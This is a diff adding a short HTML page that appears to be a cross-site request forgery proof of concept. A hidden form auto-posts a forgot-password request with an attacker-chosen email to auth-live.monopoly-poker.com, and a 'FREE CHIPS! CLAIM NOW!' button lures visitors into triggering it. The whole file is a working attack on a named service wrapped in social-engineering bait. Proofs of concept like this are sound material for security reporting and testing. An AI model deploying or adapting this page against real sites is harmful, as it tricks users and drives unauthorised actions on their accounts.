@@ -1,0 +1,19 @@
+<html>
+<body>
+    <!-- This form will auto-submit -->
+    <form id="attack" method="POST" action="https://auth-live.monopoly-poker.com/forgot-password">
+        <input type="hidden" name="email" value="kanos59730@deposin.com">
+    </form>
+
+    <h1>FREE CHIPS! 🎰</h1>
+    <p>Click button to claim</p>
+    <button onclick="submitForm()">CLAIM NOW!</button>
+
+    <script>
+        function submitForm() {
+            document.getElementById('attack').submit();
+            alert('Check your email for verification!');
+        }
+    </script>
+</body>
+</html>
